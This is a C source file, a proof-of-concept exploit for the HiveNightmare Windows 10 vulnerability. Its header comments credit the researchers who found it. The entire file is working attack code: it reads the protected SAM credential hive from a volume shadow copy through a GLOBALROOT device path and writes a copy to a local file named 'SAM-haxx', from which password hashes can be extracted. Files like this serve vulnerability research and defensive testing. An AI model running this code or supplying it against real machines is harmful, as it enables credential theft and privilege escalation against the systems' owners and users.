// Exploit for HiveNightmare, discovered by @jonasLyk, PoC by @GossiTheDog, powered by Porgs
// Allows you to read SAM data (sensitive) in Windows 10

// History
// 0.1 - 20/07/2021 - Initial version

// Bugs and issues
// Hardcoded for snapshot #4, as this works on my PC - really, it should cycle through them all to find the latest.

#include <windows.h>
#include <stdio.h>

void main()
{
    HANDLE hFile;
    HANDLE hAppend;
    DWORD  dwBytesRead, dwBytesWritten, dwPos;
    BYTE   buff[4096];

    // Currently hard coded to VSC #4 as I'm lame

    hFile = CreateFile(TEXT("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy4\\Windows\\System32\\config\\SAM"), // open SAM
        GENERIC_READ,             // open for reading
        0,                        // do not share
        NULL,                     // no security
        OPEN_EXISTING,            // existing file only
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Could not open SAM :( Is System Protection not enabled or vulnerability fixed?");
        return;
    }

    // Open the existing file, or if the file does not exist,
    // create a new file.

    hAppend = CreateFile(TEXT("SAM-haxx"), // open Two.txt
        FILE_APPEND_DATA,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template

    if (hAppend == INVALID_HANDLE_VALUE)
    {
        printf("Could not write SAM-haxx - permission issue rather than vulnerability issue");
        return;
    }

    // Append the SAM file to the end of the second file.
    // We should probably overwrite it really.
    

    while (ReadFile(hFile, buff, sizeof(buff), &dwBytesRead, NULL)
        && dwBytesRead > 0)
    {
        dwPos = SetFilePointer(hAppend, 0, NULL, FILE_END);
        LockFile(hAppend, dwPos, 0, dwBytesRead, 0);
        WriteFile(hAppend, buff, dwBytesRead, &dwBytesWritten, NULL);
        UnlockFile(hAppend, dwPos, 0, dwBytesRead, 0);
    }

    // Safety first.

    CloseHandle(hFile);
    CloseHandle(hAppend);
}